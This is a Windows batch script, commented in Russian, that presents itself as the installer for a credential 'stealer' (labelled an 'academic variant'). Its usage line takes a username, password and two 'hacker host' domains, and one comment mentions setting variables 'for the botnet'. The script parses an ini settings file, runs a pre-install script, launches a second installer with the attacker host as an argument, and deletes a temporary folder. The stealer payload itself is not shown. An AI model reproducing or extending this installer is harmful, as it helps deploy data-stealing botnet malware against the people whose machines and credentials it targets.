rem Файл установки стайлера (Академический вариант)
rem USAGE
rem > install.bat <username> <password> <hacker host server 1 domain> <hacker host server 2 domain>
rem Запускать файл с правами администратора

rem Инициализируем переменные окружения скрипта

SetLocal EnableExtensions EnableDelayedExpansion

set curdir=%CD%
rem создаём системные переменные Windows для ботнета
rem set PUB1=%1
rem set Hacker_host1=%2


rem Читаем настройки из файла settings.txt, который должен располагаться в
rem том же каталоге, что и bat-файл. Если не удалось распарсить настройки -
rem выходим с ненулевым кодом возврата.
call :read_settings %~dp0\installmaindistrib.ini || exit /b 1

rem Go to Temprorary Directory
cd /d %curdir%

rem Run PreChocoInstall.bat
if not exist %LocalFolder%\prechocoinstall.bat goto pass_PreCHInstall
call %LocalFolder%\prechocoinstall.bat
:pass_PreCHInstall

rem Запускаем инсталлятор стайлера "Экспонента"
call InstallMainExponenta.bat %PUB1% %Hacker_host1%
cd /d %curdir%

rem Удаляем временный каталог
rd /S /Q WindowsPowerShell

rem Выход из сценария. Дальше - только функции.
exit /b 0

rem
rem Функция для чтения настроек из файла.
rem Вход:
rem       %1           - Имя файла с настройками
:read_settings

set SETTINGSFILE=%1

rem Проверка существования файла
if not exist %SETTINGSFILE% (
    echo FAIL: Файл с настройками отсутствует
    exit /b 1
)

rem Обработка файла c настройками
rem Здесь:
rem     eol=# указывает на то, что содержимое строки начиная с символа #
rem     и до ее конца может быть пропущено как комментарий.
rem
rem     delims== указывает, что разделителем значений является символ =
rem
rem     tokens=1,2 приводит к тому, что в переменную %%i будет занесен первый
rem     токен, а в %%j - второй.
rem

for /f "eol=# delims== tokens=1,2" %%i in (%SETTINGSFILE%) do (
    rem В переменной i - ключ
    rem В переменной j - значение
    rem Мы транслируем это в переменные окружения
    set %%i=%%j
)
exit /b 0

